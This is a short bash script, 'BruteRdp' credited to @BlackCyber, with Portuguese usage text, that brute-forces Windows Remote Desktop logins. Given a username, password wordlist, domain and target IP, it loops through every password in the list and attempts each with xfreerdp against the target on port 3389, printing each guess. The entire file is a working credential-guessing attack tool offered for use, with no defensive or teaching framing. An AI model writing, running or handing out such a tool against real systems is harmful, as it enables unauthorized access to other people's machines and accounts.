#!/bin/bash
echo '
		 ____                _         ____      _
		| __ )  _ __  _   _ | |_  ___ |  _ \  __| | _ _
		|  _ \ |  __|| | | || __|/ _ \| |_) |/ _  ||  _ \
		| |_) || |   | |_| || |_|  __/|  _ <| (_| || |_) |
		|____/ |_|    \__,_| \__|\___||_| \_\\__,_|| .__/
		                                           |_|
            		Version 1.1    Author @BlackCyber
			https://github.com/BlackCyber21/
'
if [ "$1" == "" ]
then
	echo "     Modo de uso: $0 username passlist.txt domainname iptarget"
	echo "  Observe o local de sua wordlist, verifique se a porta 3389 do alvo windows ta open"
	echo
elif [ "$2" == "" ]
then
        echo "     Modo de uso: $0 username passlist.txt domainname iptarget"
	echo "  Observe o local de sua wordlist, verifique se a porta 3389 do alvo windows ta open"
	echo
elif [ "$3" == "" ]
then
        echo "     Modo de uso: $0 username passlist.txt domainname iptarget"
	echo "  Observe o local de sua wordlist, verifique se a porta 3389 do alvo windows ta open"
	echo
elif [ "$4" == "" ]
then
        echo "     Modo de uso: $0 username passlist.txt domainname iptarget"
        echo "  Observe o local de sua wordlist, verifique se a porta 3389 do alvo windows ta open"
	echo
else
for pass in $(cat $2);
do
echo ""
echo "	         Testando com: $1 : $pass"
xfreerdp /u:$1 /p:$pass /d:$3 /v:$4 1> tess.txt | tail -f tess.txt;
done
fi
